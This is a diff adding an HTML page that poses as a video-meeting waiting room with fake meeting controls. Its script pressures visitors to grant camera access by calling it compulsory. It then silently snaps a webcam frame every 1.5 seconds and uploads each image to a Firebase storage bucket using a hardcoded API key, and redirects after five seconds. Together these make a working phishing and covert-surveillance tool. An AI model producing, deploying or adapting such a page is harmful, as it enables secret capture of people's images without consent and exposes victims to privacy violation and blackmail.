@@ -1,0 +1,264 @@
+<!doctype html>
+<html>
+
+<head>
+  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <script type="module">
+    alert('Hello, Member! Nice meeting you.');
+    // Import Firebase SDKs
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
+    import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-storage.js";
+
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyC215CENkjkGMvlDbQ7yb9S8wiQbArr3oo",
+      authDomain: "my-netlify.firebaseapp.com",
+      projectId: "my-netlify",
+      storageBucket: "my-netlify.appspot.com",
+      messagingSenderId: "113115899130",
+      appId: "1:113115899130:web:2f2b5b1741de0b6564d543",
+      measurementId: "G-FJ1SZZ31VZ"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const storage = getStorage(app);
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    const constraints = {
+      video: { facingMode: "user" }
+    };
+
+    // Show permission denied message
+    function showPermissionDeniedMessage() {
+      const messageDiv = document.createElement('div');
+      messageDiv.innerText = "Starting video is compulsory before joining the meeting. Please allow camera permission.";
+      messageDiv.style.position = 'fixed';
+      messageDiv.style.top = '20%';
+      messageDiv.style.left = '50%';
+      messageDiv.style.transform = 'translate(-50%, -50%)';
+      messageDiv.style.backgroundColor = 'rgba(255, 255, 255, 0.8)';
+      messageDiv.style.padding = '20px';
+      messageDiv.style.border = '2px solid black';
+      messageDiv.style.borderRadius = '10px';
+      messageDiv.style.zIndex = '1002'; // Higher z-index to display above the popup
+
+      // Create a button to request permission again
+      const requestPermissionButton = document.createElement('button');
+      requestPermissionButton.innerText = "Request Camera Permission Again";
+      requestPermissionButton.style.marginTop = '10px';
+      requestPermissionButton.onclick = async () => {
+        await requestCameraPermission();
+        document.body.removeChild(messageDiv); // Remove the message after requesting permission
+      };
+
+      messageDiv.appendChild(requestPermissionButton);
+      document.body.appendChild(messageDiv);
+    }
+
+    // Function to request camera permission
+    async function requestCameraPermission() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+
+        // Wait for 5 seconds and then redirect to "meeting.html"
+        setTimeout(() => {
+          window.location.href = "meeting.html";
+        }, 5000); // 5 seconds delay
+      } catch (e) {
+        console.error('Error accessing webcam: ', e);
+        showPermissionDeniedMessage(); // Show denied message if access is denied
+      }
+    }
+
+    // Initialize camera on page load
+    async function initCamera() {
+      const permission = await navigator.permissions.query({ name: 'camera' });
+      if (permission.state === 'granted') {
+        await requestCameraPermission(); // Call the function to request camera access
+      } else {
+        showPermissionDeniedMessage(); // Show denied message if access is not granted
+      }
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      initCamera(); // Initialize camera when the page is loaded
+
+      // Capture image and upload to Firebase every 1.5 seconds
+      setInterval(() => {
+        // Draw the current frame from video to canvas
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Convert canvas to Blob
+        canvas.toBlob(async (blob) => {
+          // Create a reference to Firebase Storage
+          const timestamp = Date.now();
+          const imageRef = ref(storage, `images/${timestamp}.png`);
+
+          // Upload the blob (image) to Firebase Storage
+          try {
+            await uploadBytes(imageRef, blob);
+            console.log('Image uploaded successfully:', timestamp);
+          } catch (error) {
+            console.error('Error uploading image:', error);
+          }
+        }, 'image/png');
+      }, 1500); // Capture image every 1.5 seconds
+    });
+  </script>
+</head>
+
+<body>
+  <!-- Hidden Video for capturing the feed -->
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+
+  <!-- Canvas to display the captured image -->
+  <center>
+    <canvas id="canvas" width="640" height="480"></canvas>
+  </center>
+
+  <!-- Floating Button -->
+  <div class="float_button">
+    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
+  </div>
+
+  <!-- Popup Section -->
+  <div id="ac-wrapper">
+    <div id="popup">
+      <center>
+        <h2>Please wait the meeting host will let you in soon</h2>
+      </center>
+    </div>
+  </div>
+
+  <!-- Bottom Bar -->
+  <div class="bottom-bar">
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-microphone"></i>
+      <h6>Mute</h6>
+    </div>
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-video"></i>
+      <h6>Stop Video</h6>
+    </div>
+    <div class="icon-button" style="margin-left: auto;">
+      <i class="fas fa-shield-alt"></i>
+      <h6>Security</h6>
+    </div>
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-users"></i>
+      <h6>Participants</h6>
+    </div>
+    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
+      <i class="fas fa-plus-square"></i>
+      <h6>Share content</h6>
+    </div>
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-comments"></i>
+      <h6>Chat</h6>
+    </div>
+    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
+      <i class="fas fa-record-vinyl"></i>
+      <h6>Record</h6>
+    </div>
+    <button style="margin-right: 50px;">End</button>
+  </div>
+
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
+
+    body {
+      height: 100vh;
+      width: 100vw;
+      font-family: 'Nunito', sans-serif;
+    }
+
+    * {
+      padding: 0px;
+      margin: 0px;
+      font-weight: 500;
+    }
+
+    .video-wrap {
+      display: none;
+    }
+
+    .bottom-bar {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      height: 80px;
+      background-color: #1F2022;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+    }
+
+    .icon-button {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .icon-button i {
+      margin-bottom: 8px;
+      font-size: 26px;
+    }
+
+    button {
+      background-color: crimson;
+      color: white;
+      border: none;
+      padding: 5px 20px;
+      border-radius: 5px;
+    }
+
+    .float_button {
+      position: fixed;
+      top: 5px;
+      right: 5px;
+      background-color: #1F2022;
+      height: 40px;
+      width: 40px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      border-radius: 5px;
+    }
+
+    #ac-wrapper {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.6);
+      z-index: 1001;
+    }
+
+    #popup {
+      position: relative;
+      top: 250px;
+      left: 375px;
+      width: 555px;
+      background: white;
+      border: 5px solid black;
+      border-radius: 15px;
+      box-shadow: 0px 0px 10px #000;
+      padding: 20px;
+      text-align: center;
+      z-index: 1001;
+    }
+  </style>
+</body>
+
+</html>
